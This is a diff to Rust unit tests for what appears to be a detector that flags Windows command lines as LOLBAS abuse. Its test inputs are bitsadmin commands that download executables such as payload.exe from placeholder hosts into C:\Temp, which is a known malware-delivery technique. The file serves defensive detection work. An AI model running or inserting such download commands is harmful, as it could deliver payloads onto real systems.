@@ -11673,18 +11673,26 @@ mod bitsadmin_tests {
 
     #[test]
     fn bitsadmin_transfer_emits_download() {
+        let raw =
+            "bitsadmin /transfer myjob /Download /Priority FOREGROUND http://x/y.exe C:\\temp\\y.exe";
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            "bitsadmin /transfer myjob /Download /Priority FOREGROUND http://x/y.exe C:\\temp\\y.exe",
-            &mut env,
-        );
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::BitsadminDownload { url, dst }
                     if url == "http://x/y.exe" && dst == "C:\\temp\\y.exe"
             )
         });
+        let has_lolbas = env
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == raw));
         assert!(has, "no BitsadminDownload: {:?}", env.traits);
+        assert!(
+            has_lolbas,
+            "bitsadmin transfer not marked as LOLBAS: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -11732,11 +11740,9 @@ mod bitsadmin_tests {
 
     #[test]
     fn bitsadmin_addfile_emits_download() {
+        let raw = r#"bitsadmin /addfile "job1" "https://bits-addfile.example/payload.exe" "C:\Temp\payload.exe""#;
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"bitsadmin /addfile "job1" "https://bits-addfile.example/payload.exe" "C:\Temp\payload.exe""#,
-            &mut env,
-        );
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::BitsadminDownload { url, dst }
@@ -11744,7 +11750,16 @@ mod bitsadmin_tests {
                         && dst == "C:\\Temp\\payload.exe"
             )
         });
+        let has_lolbas = env
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == raw));
         assert!(has, "no addfile BitsadminDownload: {:?}", env.traits);
+        assert!(
+            has_lolbas,
+            "bitsadmin addfile not marked as LOLBAS: {:?}",
+            env.traits
+        );
         assert!(env
             .modified_filesystem
             .contains_key(r#"c:\temp\payload.exe"#));
